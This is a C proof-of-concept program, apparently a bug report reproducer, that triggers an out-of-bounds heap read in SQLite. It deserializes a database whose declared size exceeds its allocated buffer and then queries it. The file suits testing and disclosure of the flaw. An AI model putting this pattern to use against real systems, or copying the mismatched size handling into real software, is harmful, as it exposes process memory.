/*
 * Reproducer for heap-buffer-overflow READ via sqlite3_deserialize()
 *
 * Bug: sqlite3_deserialize() does not validate that szDb <= szBuf.
 * When szDb > szBuf, the internal MemStore has sz > szAlloc.
 * Any read at offsets beyond szAlloc (but within sz) reads past the heap buffer.
 *
 * In memdbRead() (memdb.c line 266):
 *   memcpy(zBuf, p->aData+iOfst, iAmt);  // OOB when iOfst >= szAlloc
 *
 * CWE-125: Out-of-bounds Read
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "sqlite3.h"

int main(void) {
    sqlite3 *db = NULL;
    int rc;
    sqlite3_int64 sz = 0;
    unsigned char *pBuf = NULL;

    /* Step 1: Create a database with enough data to span multiple pages */
    rc = sqlite3_open(":memory:", &db);
    if (rc != SQLITE_OK) return 1;

    rc = sqlite3_exec(db,
        "CREATE TABLE t1(x TEXT);"
        "INSERT INTO t1 VALUES(zeroblob(5000));"
        "INSERT INTO t1 VALUES(zeroblob(5000));"
        "INSERT INTO t1 VALUES(zeroblob(5000));"
        "INSERT INTO t1 VALUES(zeroblob(5000));"
        "INSERT INTO t1 VALUES(zeroblob(5000));"
        "INSERT INTO t1 VALUES(zeroblob(5000));",
        NULL, NULL, NULL);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "SQL error: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);
        return 1;
    }

    /* Step 2: Serialize */
    pBuf = sqlite3_serialize(db, "main", &sz, 0);
    if (!pBuf || sz <= 0) {
        fprintf(stderr, "Serialize failed\n");
        sqlite3_close(db);
        return 1;
    }
    printf("Full serialized size: %lld bytes\n", (long long)sz);
    sqlite3_close(db);
    db = NULL;

    /* Step 3: Allocate only a SMALLER buffer using system malloc.
     * Copy only the first part. The rest of the "database" will be
     * past the allocation boundary.
     */
    sqlite3_int64 truncSz = 8192;  /* Only allocate 8KB */
    if (truncSz >= sz) {
        fprintf(stderr, "DB too small, need > 8192 bytes, got %lld\n", (long long)sz);
        sqlite3_free(pBuf);
        return 1;
    }

    unsigned char *pData = (unsigned char *)malloc((size_t)truncSz);
    if (!pData) {
        sqlite3_free(pBuf);
        return 1;
    }
    memcpy(pData, pBuf, (size_t)truncSz);
    sqlite3_free(pBuf);

    printf("Allocated buffer: %lld bytes (truncated from %lld)\n",
           (long long)truncSz, (long long)sz);

    /* Step 4: Deserialize with szDb = full size, szBuf = truncated size.
     * SQLite will think the database is 'sz' bytes but only 'truncSz' is allocated.
     */
    rc = sqlite3_open(":memory:", &db);
    if (rc != SQLITE_OK) {
        free(pData);
        return 1;
    }

    rc = sqlite3_deserialize(db, "main", pData, sz, truncSz, 0);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "Deserialize failed: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);
        free(pData);
        return 1;
    }

    printf("Deserialized: szDb=%lld, szBuf=%lld (heap overflow on read!)\n",
           (long long)sz, (long long)truncSz);

    /* Step 5: Read data. SQLite will follow btree pointers to pages past
     * the allocation, triggering heap-buffer-overflow in memdbRead.
     */
    sqlite3_stmt *pStmt = NULL;
    rc = sqlite3_prepare_v2(db, "SELECT length(x) FROM t1", -1, &pStmt, NULL);
    if (rc == SQLITE_OK) {
        while (sqlite3_step(pStmt) == SQLITE_ROW) {
            printf("len(x) = %d\n", sqlite3_column_int(pStmt, 0));
        }
        sqlite3_finalize(pStmt);
    } else {
        printf("Prepare failed: %s\n", sqlite3_errmsg(db));
    }

    sqlite3_close(db);
    free(pData);
    return 0;
}
